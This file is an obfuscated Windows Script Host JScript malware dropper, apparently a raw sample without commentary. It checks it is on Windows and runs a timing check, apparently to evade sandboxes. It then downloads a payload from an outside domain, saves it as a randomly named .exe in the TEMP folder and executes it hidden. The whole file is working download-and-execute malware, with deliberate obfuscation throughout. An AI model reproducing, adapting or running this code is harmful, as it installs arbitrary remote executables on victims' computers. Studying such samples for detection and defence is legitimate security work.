var S = false;
var U0 = "CreateObject";
var x0 = function SJ() {return WScript[U0]("WScript.Shell");}(), a1 = 11;
var SJ0 = "MSXML2.XMLHTTP";
var a0 = 2123213;
var D = 0;
function Z(a){x0["Run"](a, D, D);};
function U(){return "" + SJ0;};
function NQ(iU, u0){D = D * 1; return iU - u0;};
function LD(){return U0;};
/*@cc_on
  @if (@_win32 || @_win64)
    S = true;
  @end
@*/
if (S)
{
var o = "";
function rc(){return 22;};
var Xo = 0; var N = 0;
function j()
{
var M0 = new this["Date"]();
var M = M0["getUTCMilliseconds"]();
WScript["Sleep"](rc());
var M0 = new this["Date"]();
var jU = M0["getUTCMilliseconds"]();
WScript["Sleep"](rc());
var M0 = new this["Date"]();
var d = M0["getUTCMilliseconds"]();
var Xo = "YJ";
Xo = NQ(jU, M);
var N = "wm";
N = NQ(d, jU);
o = "open";
return NQ(Xo, N);
}
var V = false;
var Is = false;
for (var tG = D; tG < rc() * 1; tG++){if (j() != D){
V = true; 
N = "31" + 11 * Xo + N; 
Is = true; 
break;
}}
function c() {return ((V == true) && (V == Is)) ? 1 : D;};
if (V && c() && Is){
function jS() {return x0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "p8OQX4Ddufq6.exe";};
 Z0 = U();
 dk = WScript[U0](Z0);
 var nJ = 1;
 while (nJ){
try {
dk[o]("GET", "http://shippedmedicalsupplies.com/n5ids", false);
dk["send"]();
iF = "Sleep";
for (;;){WScript[iF](rc() * 11); if (dk["readystate"] >= 2 * 2) break;};
nJ = D;
} catch(KE){};
}
function u(rb) {var Jb = (1, 2, 3, 4, 5, rb); return Jb;};
X = WScript[LD()]("ADODB.Stream");
Z0 = X;
Z0[o]();
Z0["type"] = u(1);
Z0["write"](dk["ResponseBody"]);
X["position"] = u(D);
Z0["Save" + "ToFile"](jS(), 2);
X["c"+"lose"]();
x = jS();
Z(x);
}
}

